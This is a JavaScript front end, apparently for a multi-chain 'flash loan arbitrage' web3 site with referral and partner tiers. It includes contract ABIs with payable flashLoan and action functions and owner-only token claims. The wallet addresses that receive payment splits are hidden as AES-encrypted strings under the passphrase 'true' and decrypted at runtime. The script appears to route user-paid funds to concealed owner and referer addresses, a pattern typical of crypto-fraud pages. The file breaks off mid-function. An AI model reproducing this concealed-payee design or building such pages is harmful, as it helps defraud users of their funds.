const stormMultisender = {
	address: '0xF02CA21e3aF44509372637b9326f31ec5C2E4555',
	abi: [
		{
			"constant": false,
			"inputs": [],
			"name": "action",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "token",
					"type": "address"
				},
				{
					"name": "_contributors",
					"type": "address[]"
				},
				{
					"name": "_balances",
					"type": "uint256[]"
				}
			],
			"name": "multisendToken",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newLimit",
					"type": "uint16"
				}
			],
			"name": "changeTreshold",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "link",
			"outputs": [
				{
					"name": "",
					"type": "string"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [
				{
					"name": "_customer",
					"type": "address"
				}
			],
			"name": "currentFee",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newFee",
					"type": "uint256"
				}
			],
			"name": "changeFee",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "tokenSymbol",
			"outputs": [
				{
					"name": "",
					"type": "string"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newLink",
					"type": "string"
				}
			],
			"name": "updateLink",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "owner",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "tokenAddress",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "pair",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_contributors",
					"type": "address[]"
				},
				{
					"name": "_balances",
					"type": "uint256[]"
				}
			],
			"name": "multisendEther",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_pair",
					"type": "address"
				},
				{
					"name": "_loanAmount",
					"type": "uint256"
				}
			],
			"name": "arbitrage",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "arrayLimit",
			"outputs": [
				{
					"name": "",
					"type": "uint16"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"name": "txCount",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newStep",
					"type": "uint256"
				}
			],
			"name": "changeDiscountStep",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newPendingOwner",
					"type": "address"
				}
			],
			"name": "claimOwner",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "fee",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_token",
					"type": "address"
				}
			],
			"name": "claimTokens",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "pendingOwner",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "discountStep",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_tokenAddress",
					"type": "address"
				},
				{
					"name": "_tokenSymbol",
					"type": "string"
				},
				{
					"name": "_loanAmount",
					"type": "uint256"
				}
			],
			"name": "flashLoan",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [
				{
					"name": "_customer",
					"type": "address"
				}
			],
			"name": "discountRate",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"inputs": [
				{
					"name": "_owner",
					"type": "address"
				},
				{
					"name": "_pendingOwner",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"payable": true,
			"stateMutability": "payable",
			"type": "fallback"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"name": "total",
					"type": "uint256"
				},
				{
					"indexed": false,
					"name": "tokenAddress",
					"type": "address"
				}
			],
			"name": "Multisended",
			"type": "event"
		},
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"name": "token",
					"type": "address"
				},
				{
					"indexed": false,
					"name": "owner",
					"type": "address"
				},
				{
					"indexed": false,
					"name": "balance",
					"type": "uint256"
				}
			],
			"name": "ClaimedTokens",
			"type": "event"
		}
	]
};
const partnerManager = {
	address: '0xf208Ccc90299a7fd5E39f865d75113ab9156F21c',
	abi: [
		{
			"constant": true,
			"inputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"name": "partner",
			"outputs": [
				{
					"name": "",
					"type": "bool"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "bookmark",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "link",
			"outputs": [
				{
					"name": "",
					"type": "string"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "note",
			"outputs": [
				{
					"name": "",
					"type": "string"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newrecoveryOwner",
					"type": "address"
				}
			],
			"name": "recoveryOwner",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newPartner",
					"type": "address"
				}
			],
			"name": "becomePartner",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newNote",
					"type": "string"
				}
			],
			"name": "updateNote",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "partnerTax",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newLink",
					"type": "string"
				}
			],
			"name": "updateLink",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "recoveryOwner",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newOwner",
					"type": "address"
				}
			],
			"name": "newOwner",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newtax",
					"type": "uint256"
				}
			],
			"name": "newTax",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newPartner",
					"type": "address"
				}
			],
			"name": "addPartner",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "owner",
			"outputs": [
				{
					"name": "",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": true,
			"inputs": [],
			"name": "tax",
			"outputs": [
				{
					"name": "",
					"type": "uint256"
				}
			],
			"payable": false,
			"stateMutability": "view",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [],
			"name": "becomePartner_auto",
			"outputs": [],
			"payable": true,
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"constant": false,
			"inputs": [
				{
					"name": "_newPartner",
					"type": "address"
				}
			],
			"name": "removePartner",
			"outputs": [],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "function"
		},
		{
			"inputs": [
				{
					"name": "_owner",
					"type": "address"
				},
				{
					"name": "_recoveryOwner",
					"type": "address"
				}
			],
			"payable": false,
			"stateMutability": "nonpayable",
			"type": "constructor"
		},
		{
			"payable": true,
			"stateMutability": "payable",
			"type": "fallback"
		}
	]
}

var ticker_check = "";
let hash;
const quick_node = {
	encrypted_key: "true"
}

//ETHEREUM
let logo_eth = "assets/image/logo/logo_eth.png";
let address_main = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
let name_main = "Ethereum Wrapped";
let nameTicker_main = "Ethereum Wrapped (wETH)";
let image_main = "assets/image/token/eth/weth.png";
let ticker_main = "wETH";

let address_usd = "0xdac17f958d2ee523a2206206994597c13d831ec7";
let name_usd = "Tether USD";
let nameTicker_usd = "Tether USD (USDT)";
let image_usd = "assets/image/token/eth/usdt.png";
let ticker_usd = "USDT";

let address_meme = "0x35a532d376ffd9a705d0bb319532837337a398e7";
let name_meme = "Dogecoin";
let nameTicker_meme = "Dogecoin (DOGE)";
let image_meme = "assets/image/token/eth/doge.png";
let ticker_meme = "DOGE";

let address_meme2 = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE";
let name_meme2 = "Shiba Inu";
let nameTicker_meme2 = "Shiba Inu (SHIB)";
let image_meme2 = "assets/image/token/eth/shib.png";
let ticker_meme2 = "SHIB";

// BSC
const logo_bsc = "assets/image/logo/logo_bsc.png";
const bsc_address_main = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";
const bsc_name_main = "BNB Wrapped";
const bsc_nameTicker_main = "BNB Wrapped (wBNB)";
const bsc_image_main = "assets/image/token/bsc/bnb.png";
const bsc_ticker_main = "wBNB";

const bsc_address_usd = "0xe9e7cea3dedca5984780bafc599bd69add087d56";
const bsc_name_usd = "Binance-Peg BUSD";
const bsc_nameTicker_usd = "Binance-Peg BUSD (BUSD)";
const bsc_image_usd = "assets/image/token/bsc/busd.png";
const bsc_ticker_usd = "BUSD";

const bsc_address_meme = "0x2170ed0880ac9a755fd29b2688956bd959f933f8";
const bsc_name_meme = "Binance-Peg Ethereum";
const bsc_nameTicker_meme = "Binance-Peg Ethereum (ETH)";
const bsc_image_meme = "assets/image/token/eth/weth.png";
const bsc_ticker_meme = "ETH";

const bsc_address_meme2 = "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82";
const bsc_name_meme2 = "Pancakeswap";
const bsc_nameTicker_meme2 = "Pancakeswap (CAKE)";
const bsc_image_meme2 = "assets/image/token/bsc/cake.png";
const bsc_ticker_meme2 = "CAKE";

// POLYGON
const logo_matic = "assets/image/logo/logo_matic.png";
const matic_address_main = "0x0000000000000000000000000000000000001010";
const matic_name_main = "Matic Token";
const matic_nameTicker_main = "Matic Token (MATIC)";
const matic_image_main = "assets/image/token/matic/matic.png";
const matic_ticker_main = "MATIC";

const matic_address_usd = "0xc2132d05d31c914a87c6611c10748aeb04b58e8f";
const matic_name_usd = "Tether USD";
const matic_nameTicker_usd = "Tether USD (USDT)";
const matic_image_usd = "assets/image/token/eth/usdt.png";
const matic_ticker_usd = "USDT";

const matic_address_meme = "0x7ceb23fd6bc0add59e62ac25578270cff1b9f619";
const matic_name_meme = "WETH";
const matic_nameTicker_meme = "Wrapped Ether (WETH)";
const matic_image_meme = "assets/image/token/eth/weth.png";
const matic_ticker_meme = "WETH";

const matic_address_meme2 = "0x3BA4c387f786bFEE076A58914F5Bd38d668B42c3";
const matic_name_meme2 = "Wrapped BNB";
const matic_nameTicker_meme2 = "Wrapped BNB (BNB)";
const matic_image_meme2 = "assets/image/token/bsc/bnb.png";
const matic_ticker_meme2 = "BNB";

// AVALANCHE
const logo_avax = "assets/image/logo/logo_avax.png";
const avax_address_main = "0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7";
const avax_name_main = "Wrapped Avax Token";
const avax_nameTicker_main = "Avalanche Wrapped Token (WAVAX)";
const avax_image_main = "assets/image/token/avax/avax.png";
const avax_ticker_main = "WAVAX";

const avax_address_usd = "0xc7198437980c041c805a1edcba50c1ce5db95118";
const avax_name_usd = "Tether USD";
const avax_nameTicker_usd = "Tether USD (USDT.e)";
const avax_image_usd = "assets/image/token/eth/usdt.png";
const avax_ticker_usd = "USDT.e";

const avax_address_meme = "0x02d980a0d7af3fb7cf7df8cb35d9edbcf355f665";
const avax_name_meme = "Shiba Inu";
const avax_nameTicker_meme = "Shiba Inu (SHIB.e)";
const avax_image_meme = "assets/image/token/eth/shib.png";
const avax_ticker_meme = "SHIB.e";

const avax_address_meme2 = "0x50b7545627a5162f82a992c33b87adc75187b218";
const avax_name_meme2 = "Wrapped BTC";
const avax_nameTicker_meme2 = "Wrapped BTC (WBTC.e)";
const avax_image_meme2 = "assets/image/btc.png";
const avax_ticker_meme2 = "WBTC.e";

const homeLink = location.href.substring(18, 28);

let split;
let referer_quote;
let referer2_quote;
let partner_name;
let ref;
let partner;
let referer;
let referer_2;
let ref_base;
let refererCall;
let partner_aff;

let splitter;
let quote;
let quote_ref;
let partnerName;
let checkPartner;

let refBaseQuote;
let refBaseQuoteRef;
let refMultiQuote;
let refMultiQuoteRef;

const gwei = 1000000000;

async function _gasPrice() {
	gasEther = new BigNumber(await web3.eth.getGasPrice() / gwei).c[0]
	document.getElementById("gasEther").innerHTML = gasEther;
	
	return {gasEther};
}
async function _gasPriceCheck() {
	gasEtherC = new BigNumber(await web3.eth.getGasPrice()).c[0]
	
	return {gasEtherC};
}

const dist = {
	dev: {
		key: 'U2FsdGVkX19G5T+6a/iNLZZc7g1sTxm3V5FCef6U7tdgFgHHwqGbyexgvv/oavLxaGTqfgK7mEHUcHl0mvPZjg==',
		key_2: 'U2FsdGVkX18k4WfSDImp+7mGznO6WFncwWvFyvhZlYdHU9gNbhctkePQDsziWQCih1V5r9OeXCcZJ3aX/d9nPg==',
		chain: ['Ethereum', 'BSC', 'Matic', "Avax"],
		referral: true,
		multilevel: true,
		quote: {
			direct: 50,
			referral: 45,
			multilevel: 45,
			plus: 37,
			partner: 0,
			referral: 10
		}
	},
	ref: {
		base: {
			quote: document.getElementById("refBaseQuote").innerHTML, //dist.ref.base.quote
			quote_ref: document.getElementById("refBaseQuoteRef").innerHTML,
			quote_dev: document.getElementById("refBaseQuoteDev").innerHTML
		},
		multi: {
			quote: document.getElementById("refMultiQuote").innerHTML,
			quote_ref: document.getElementById("refMultiQuoteRef").innerHTML,
			quote_dev: document.getElementById("refMultiQuoteDev").innerHTML
		}
	},
	burn: {
		chain: ['Ethereum', 'BSC', 'Matic', "Avax"],
		referral: false,
		multilevel: false,
		quote: 33,
		quote_ref: 0,
	},
	main: {
		key: 'U2FsdGVkX1/E/Ten85a+1ZGrma1XHVkCykAPBiI/KOYhw684Ui0uq8nMCcLQWQnDQI3eG5Od5iPLFOVtSDubtA==',
		chain: ['Ethereum', 'BSC', 'Matic', "Avax"],
		referral: false,
		multilevel: false,
		quote: 100,
		quote_ref: 0,
	},
	snap: {
		key: 'U2FsdGVkX1/5TG/rglC9X0ceKjAoF+gErNR5M8PPcCG5orhFItE5fT+EYZ3IuRlAxzVu9X37bVGhuCMNFWTeMQ==',
		chain: ['Ethereum', 'BSC', 'Matic', "Avax"],
		referral: true,
		multilevel: true,
		quote: 33,
		quote_ref: 5,
	}
};

	const main_utf = CryptoJS.AES.decrypt(dist.dev.key, "true").toString(CryptoJS.enc.Utf8); //dev1
	const mein_utf = CryptoJS.AES.decrypt(dist.dev.key_2, "true").toString(CryptoJS.enc.Utf8); //dev2
	const dev_utf = CryptoJS.AES.decrypt(dist.main.key, "true").toString(CryptoJS.enc.Utf8); //owner
	const snap_utf = CryptoJS.AES.decrypt(dist.snap.key, "true").toString(CryptoJS.enc.Utf8); //snap

async function getBalance() {
	address = web3.eth.getAccounts(function(err, acc) {
		accounts = acc
	});
	balance = web3.utils.fromWei(await web3.eth.getBalance(accounts[0]), 'ether');
	fixbalance = Number(balance).toFixed(2);
	document.getElementById("mybalance").innerHTML = fixbalance;
}

function fixNumber(n) {
	return Math.round((n) * 1e12) / 1e12;
}

function openNav() {
	if (screen && screen.width > 800) {
		document.getElementById("mySidenav").style.width = "35%";
		document.getElementById("main").style.marginLeft = "250px";
		document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
	} else if (screen && screen.width <= 800) {
		document.getElementById("mySidenav").style.width = "75%";
		document.getElementById("main").style.marginLeft = "250px";
		document.body.style.backgroundColor = "rgba(0,0,0,0.4)";
	}
}

function closeNav() {
	document.getElementById("mySidenav").style.width = "0";
	document.getElementById("main").style.marginLeft = "0";
	document.body.style.backgroundColor = "white";
}

function increment() {
	document.getElementById('loanAmtInput2').stepUp();
}

function decrement() {
	document.getElementById('loanAmtInput2').stepDown();
}

function mydrop() {
	document.getElementById("myDropdown").classList.toggle("show");
}

window.onclick = function(event) {
	if (!event.target.matches('.dropbtn')) {
		var dropdowns = document.getElementsByClassName("dropdown-content");
		var i;
		for (i = 0; i < dropdowns.length; i++) {
			var openDropdown = dropdowns[i];
			if (openDropdown.classList.contains('show')) {
				openDropdown.classList.remove('show');
			}
		}
	}
}

function closeMe() {
	document.getElementById("myDropdown").classList.remove('show');
}


async function getAccount() {
	accounts = await ethereum.request({
		method: 'eth_requestAccounts'
	});
}

async function myaddress() {
	accounts = await ethereum.request({
		method: 'eth_requestAccounts'
	})

	document.getElementById("fullacc").innerHTML = accounts[0];
	var acc1 = accounts[0].substring(0, 6);
	var acc2 = accounts[0].substring(44, 38);
	document.getElementById("refacc").innerHTML = acc1 + "...";
	document.getElementById("myacc").innerHTML = acc1 + "..." + acc2;
}

function tokenImages() {
	if (window.isEth) {
		document.getElementById("logoImage").src = logo_eth;
		document.getElementById("currentProvider").innerHTML = "Ethereum";

		document.getElementById("mainImage").src = image_main;
		document.getElementById("usdImage").src = image_usd;
		document.getElementById("memeImage").src = image_meme;
		document.getElementById("meme2Image").src = image_meme2;

		document.getElementById("mainAddr").innerHTML = address_main;
		document.getElementById("usdAddr").innerHTML = address_usd;
		document.getElementById("memeAddr").innerHTML = address_meme;
		document.getElementById("meme2Addr").innerHTML = address_meme2;

		document.getElementById("mainNameTicker").innerHTML = name_main + " (" + ticker_main + ")";
		document.getElementById("usdNameTicker").innerHTML = name_usd + " (" + ticker_usd + ")";
		document.getElementById("memeNameTicker").innerHTML = name_meme + " (" + ticker_meme + ")";
		document.getElementById("meme2NameTicker").innerHTML = name_meme2 + " (" + ticker_meme2 + ")";

	} else if (window.isBnb) {
		document.getElementById("logoImage").src = logo_bsc;
		document.getElementById("currentProvider").innerHTML = "Binance Smart Chain";

		document.getElementById("mainImage").src = bsc_image_main;
		document.getElementById("usdImage").src = bsc_image_usd;
		document.getElementById("memeImage").src = bsc_image_meme;
		document.getElementById("meme2Image").src = bsc_image_meme2;

		document.getElementById("mainAddr").innerHTML = bsc_address_main;
		document.getElementById("usdAddr").innerHTML = bsc_address_usd;
		document.getElementById("memeAddr").innerHTML = bsc_address_meme;
		document.getElementById("meme2Addr").innerHTML = bsc_address_meme2;

		document.getElementById("mainNameTicker").innerHTML = bsc_name_main + " (" + bsc_ticker_main + ")";
		document.getElementById("usdNameTicker").innerHTML = bsc_name_usd + " (" + bsc_ticker_usd + ")";
		document.getElementById("memeNameTicker").innerHTML = bsc_name_meme + " (" + bsc_ticker_meme + ")";
		document.getElementById("meme2NameTicker").innerHTML = bsc_name_meme2 + " (" + bsc_ticker_meme2 + ")";

		image_main = bsc_image_main;
		image_usd = bsc_image_usd;
		image_meme = bsc_image_meme;
		image_meme2 = bsc_image_meme2;

		address_main = bsc_address_main;
		address_usd = bsc_address_usd;
		address_meme = bsc_address_meme;
		address_meme2 = bsc_address_meme2;

		name_main = bsc_name_main;
		name_usd = bsc_name_usd;
		name_meme = bsc_name_meme;
		name_meme2 = bsc_name_meme2;

		ticker_main = bsc_ticker_main;
		ticker_usd = bsc_ticker_usd;
		ticker_meme = bsc_ticker_meme;
		ticker_meme2 = bsc_ticker_meme2;

	} else if (window.isMatic) {
		document.getElementById("logoImage").src = logo_matic;
		document.getElementById("currentProvider").innerHTML = "Polygon Matic Chain";

		document.getElementById("mainImage").src = matic_image_main;
		document.getElementById("usdImage").src = matic_image_usd;
		document.getElementById("memeImage").src = matic_image_meme;
		document.getElementById("meme2Image").src = matic_image_meme2;

		document.getElementById("mainAddr").innerHTML = matic_address_main;
		document.getElementById("usdAddr").innerHTML = matic_address_usd;
		document.getElementById("memeAddr").innerHTML = matic_address_meme;
		document.getElementById("meme2Addr").innerHTML = matic_address_meme2;

		document.getElementById("mainNameTicker").innerHTML = matic_name_main + " (" + matic_ticker_main + ")";
		document.getElementById("usdNameTicker").innerHTML = matic_name_usd + " (" + matic_ticker_usd + ")";
		document.getElementById("memeNameTicker").innerHTML = matic_name_meme + " (" + matic_ticker_meme + ")";
		document.getElementById("meme2NameTicker").innerHTML = matic_name_meme2 + " (" + matic_ticker_meme2 + ")";

		image_main = matic_image_main;
		image_usd = matic_image_usd;
		image_meme = matic_image_meme;
		image_meme2 = matic_image_meme2;

		address_main = matic_address_main;
		address_usd = matic_address_usd;
		address_meme = matic_address_meme;
		address_meme2 = matic_address_meme2;

		name_main = matic_name_main;
		name_usd = matic_name_usd;
		name_meme = matic_name_meme;
		name_meme2 = matic_name_meme2;

		ticker_main = matic_ticker_main;
		ticker_usd = matic_ticker_usd;
		ticker_meme = matic_ticker_meme;
		ticker_meme2 = matic_ticker_meme2;

	} else if (window.isAvax) {
		document.getElementById("logoImage").src = logo_avax;
		document.getElementById("currentProvider").innerHTML = "Avalanche Mainnet C-Chain";

		document.getElementById("mainImage").src = avax_image_main;
		document.getElementById("usdImage").src = avax_image_usd;
		document.getElementById("memeImage").src = avax_image_meme;
		document.getElementById("meme2Image").src = avax_image_meme2;

		document.getElementById("mainAddr").innerHTML = avax_address_main;
		document.getElementById("usdAddr").innerHTML = avax_address_usd;
		document.getElementById("memeAddr").innerHTML = avax_address_meme;
		document.getElementById("meme2Addr").innerHTML = avax_address_meme2;

		document.getElementById("mainNameTicker").innerHTML = avax_name_main + " (" + avax_ticker_main + ")";
		document.getElementById("usdNameTicker").innerHTML = avax_name_usd + " (" + avax_ticker_usd + ")";
		document.getElementById("memeNameTicker").innerHTML = avax_name_meme + " (" + avax_ticker_meme + ")";
		document.getElementById("meme2NameTicker").innerHTML = avax_name_meme2 + " (" + avax_ticker_meme2 + ")";

		image_main = avax_image_main;
		image_usd = avax_image_usd;
		image_meme = avax_image_meme;
		image_meme2 = avax_image_meme2;

		address_main = avax_address_main;
		address_usd = avax_address_usd;
		address_meme = avax_address_meme;
		address_meme2 = avax_address_meme2;

		name_main = avax_name_main;
		name_usd = avax_name_usd;
		name_meme = avax_name_meme;
		name_meme2 = avax_name_meme2;

		ticker_main = avax_ticker_main;
		ticker_usd = avax_ticker_usd;
		ticker_meme = avax_ticker_meme;
		ticker_meme2 = avax_ticker_meme2;
	} else {
		document.getElementById("logoImage").src = logo_eth;
	}
}

function main() {
	ticker_check = ticker_main;
	document.getElementById("dropaddr").value = address_main;
	document.getElementById("dropname").value = name_main;
	document.getElementById("dropticker").value = ticker_main;
	getEl();
}

function usd() {
	ticker_check = ticker_usd;
	document.getElementById("dropaddr").value = address_usd;
	document.getElementById("dropname").value = name_usd;
	document.getElementById("dropticker").value = ticker_usd;
	getEl();
}

function meme() {
	ticker_check = ticker_meme;
	document.getElementById("dropaddr").value = address_meme;
	document.getElementById("dropname").value = name_meme;
	document.getElementById("dropticker").value = ticker_meme;
	getEl();
}

function meme2() {
	ticker_check = ticker_meme2;
	document.getElementById("dropaddr").value = address_meme2;
	document.getElementById("dropname").value = name_meme2;
	document.getElementById("dropticker").value = ticker_meme2;
	getEl();
}

function getEl() {
	if (ticker_check == ticker_main) {
		document.getElementById("dropaddr").value = address_main;
		document.getElementById("dropname").value = name_main;
	} else if (ticker_check == ticker_usd) {
		document.getElementById("dropaddr").value = address_usd;
		document.getElementById("dropname").value = name_usd;
	} else if (ticker_check == ticker_meme) {
		document.getElementById("dropaddr").value = address_meme;
		document.getElementById("dropname").value = name_meme;
	} else if (ticker_check == ticker_meme2) {
		document.getElementById("dropaddr").value = address_meme2;
		document.getElementById("dropname").value = name_meme2;
	} else {}
}

function hide(){
	document.getElementById("loaderTx").style.visibility = "hidden";
	document.getElementById("loaderTxs").style.padding = "0px;";
}

function unhide(){
	document.getElementById("loaderTx").style.visibility = "visible";
	document.getElementById("loaderTxs").style.padding = "20px";
}

function hidePartnerInfo(){
	document.getElementById("partnerInfo").style.visibility = "hidden";
}

function unhidePartnerInfo(){
	document.getElementById("partnerInfo").style.visibility = "visible";
}

async function managerPartner() {
		
	try {
		await refererWeb3();
	} catch {
		managerP = false;
	}

	if (managerP === true) {
		isPartner = "true";
		document.getElementById("isPartner_footer").innerHTML = "Is Partner? " + isPartner;

		refBaseQuote = 26;
		refBaseQuoteRef = 0;
	
		refMultiQuote = 16;
		refMultiQuoteRef = 10;

		refBaseQuoteDev = 37;
		refMultiQuoteDev = 37;
	} else {
		isPartner = "false";
		document.getElementById("isPartner_footer").innerHTML = "Is Partner? " + isPartner;

		refBaseQuote = 10;
		refBaseQuoteRef = 0;
	
		refMultiQuote = 6;
		refMultiQuoteRef = 4;

		refBaseQuoteDev = 45;
		refMultiQuoteDev = 45;
	}

	document.getElementById("refBaseQuote").innerHTML = refBaseQuote;
	document.getElementById("refBaseQuoteRef").innerHTML = refBaseQuoteRef;
	document.getElementById("refMultiQuote").innerHTML = refMultiQuote;
	document.getElementById("refMultiQuoteRef").innerHTML = refMultiQuoteRef;

	document.getElementById("refBaseQuoteDev").innerHTML = refBaseQuoteDev;
	document.getElementById("refMultiQuoteDev").innerHTML = refMultiQuoteDev;
}

function getHomeLink() {

	//partnerAff();
	//ifPartner()
	checkPartners();

	return { homeLink }
}

function partnerAff() {

	if (homeLink == "/home.html") {
		partner_aff = location.href.substring(30, 34);
		ref_base = location.href.substring(28, 30);
	} else {
		partner_aff = location.href.substring(21, 25);
		ref_base = location.href.substring(19, 21);
	}
	return { partner_aff, ref_base };
}

function ifPartner() {
	let { partner_aff } = partnerAff();
	if (partner_aff == 'main') {
		partner = true;
		managerP = false;
		split = dev_utf;
		referer_quote = dist.main.quote;
		referer2_quote = dist.main.quote_ref;
		partner_name = 'main';
	} else if (partner_aff == 'snap') {
		partner = true;
		managerP = false;
		split = snap_utf;
		referer_quote = dist.snap.quote;
		referer2_quote = dist.snap.quote_ref;
		partner_name = 'snap';
	} else if (partner_aff == 'burn') {
		partner = true;
		managerP = false;
		split = "0x000000000000000000000000000000000000dead";
		referer_quote = dist.burn.quote;
		referer2_quote = dist.burn.quote_ref;
		partner_name = 'burn';
	} else {
		partner = false;
		managerP = false;
		split = dev_utf;
		referer_quote = 100;
		referer2_quote = 0;
		partner_name = 'dev';
	}

	splitter = split;
	quote = referer_quote;
	quote_ref = referer2_quote;
	partnerName = partner_name;
	checkPartner = partner;

	return { partnerName, quote, splitter, quote_ref, checkPartner };
}

function checkPartners() {
	let { checkPartner } = ifPartner();

	if (homeLink == "/home.html") {
		if (checkPartner == false) {
			referer = location.href.substring(30, 72);
			referer_2 = location.href.substring(74, 116);
		} else {
			referer = location.href.substring(34, 76);
			referer_2 = location.href.substring(78, 120);
		}
	} else {
		if (checkPartner == false) {
			referer = location.href.substring(21, 63);
			referer_2 = location.href.substring(65, 107);
		} else {
			referer = location.href.substring(25, 67);
			referer_2 = location.href.substring(69, 111);
		}
	}
	refererCall = referer;
	return { referer, referer_2, refererCall };
}

async function referralInfo() {

	let { partner_aff } = partnerAff();
	let { partnerName, quote, splitter, quote_ref } = ifPartner();
	let { referer_2, referer } = checkPartners();
	await managerPartner();

	// REFERRAL
	if (
		referer_2.substring(0, 2) != '0x' &&
		referer.substring(0, 2) == '0x' &&
		partner_aff.substring(0, 2) == '0x' &&
		referer.length == 42) {
			ref = {
				status: 'Referral',
				quote: refBaseQuote,
				referer: referer,
				quote_2: refBaseQuoteRef,
				referer_2: 'NaN',
				link: 'https://snapper.fi/partner.html'
			}
	}
	// MULTILEVEL
	else if (
		referer_2.substring(0, 2) == '0x' &&
		referer_2.length == 42 &&
		partner_aff.substring(0, 2) == '0x') {
			ref = {
				status: 'Referral 2nd',
				quote: refMultiQuote,
				referer: referer,
				quote_2: refMultiQuoteRef,
				referer_2: referer_2,
				link: 'https://snapper.fi/partner.html'
			}
	}
	// PARTNER
	else if (
		referer.substring(0, 2) != '0x' && //exl. referer
